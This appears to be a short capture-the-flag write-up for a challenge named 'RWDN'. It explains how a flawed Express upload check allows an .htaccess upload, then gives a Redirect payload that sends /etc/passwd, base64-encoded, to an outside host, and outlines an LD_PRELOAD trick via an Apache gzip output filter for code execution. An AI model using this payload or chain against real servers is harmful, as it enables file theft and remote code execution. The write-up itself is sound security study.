<h1>RWDN</h1>

<ul>
<li>In check.js each <code>req.files</code> is checked but <code>next()</code> is called in each iteration which causes express to continue</li>
<li>If a lot of valid files are uploaded then <code>app.post('/upload'</code> will be processes with our invalid <code>req.files[req.query.formid]</code></li>
<li>Using ^ we ca upload an .htaccess file</li>
<li>Can read arbitrary files using something like <code>Redirect 307 "http://aw.rs/?%{base64:%{file:/etc/passwd}}"</code></li>
<li>Reading the apache.conf there is <code>ExtFilterDefine 7f39f8317fgzip mode=output cmd=/bin/gzip</code></li>
<li>This output filter can be combined with <code>SetEnv LD_PRELOAD</code> to get code execution when running gzip</li>
<li>See <a href="./solv.py">solv.py</a></li>
</ul>
